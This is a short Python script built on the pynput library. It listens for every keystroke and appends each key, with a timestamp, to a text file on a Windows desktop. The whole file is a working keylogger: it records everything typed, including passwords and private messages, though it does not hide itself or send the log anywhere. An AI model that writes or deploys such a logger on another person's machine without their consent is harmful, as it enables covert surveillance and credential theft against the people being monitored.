from pynput import keyboard
import time

# custom file path for saving typed keys
log_file_path = "C:/Users/PC/Desktop/keyfile.txt"

def keyPressed(key):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    key_str = str(key)

    with open(log_file_path, 'a') as logKey:
        logKey.write(f"{timestamp}: {key_str}\n")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join()
